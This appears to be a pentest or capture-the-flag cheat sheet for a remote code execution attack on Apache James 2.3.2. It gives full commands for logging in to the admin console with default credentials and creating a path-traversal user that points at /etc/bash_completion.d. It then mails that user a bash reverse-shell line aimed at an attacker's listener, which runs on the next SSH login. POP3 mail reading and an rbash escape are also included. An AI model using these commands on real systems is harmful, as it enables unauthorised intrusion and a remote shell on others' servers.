# Apache James 2.3.2 bash_completion.d RCE

James admin (TCP 4555, default creds `root:root`) allows creating users with path traversal names. Create a user named `../../../../../../../../etc/bash_completion.d` and email it a shell — payload executes when next user logs in via SSH.

**Step 1 — Create user via James admin:**
```bash
nc <TARGET> 4555
# Login: root / root
adduser ../../../../../../../../etc/bash_completion.d password123
quit
```

**Step 2 — Send payload via SMTP:**
```bash
telnet <TARGET> 25
EHLO attacker
MAIL FROM: <attacker@attacker.com>
RCPT TO: <../../../../../../../../etc/bash_completion.d>
DATA
FROM: attacker
'
/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
.
quit
```

**Wait for SSH login** by any user — completion script runs as that user.

**Also: read mail via POP3 (TCP 110):**
```
telnet <TARGET> 110
USER <username>
PASS <password>
LIST
RETR 1
```

**rbash escape:** `ssh user@<TARGET> -t bash`
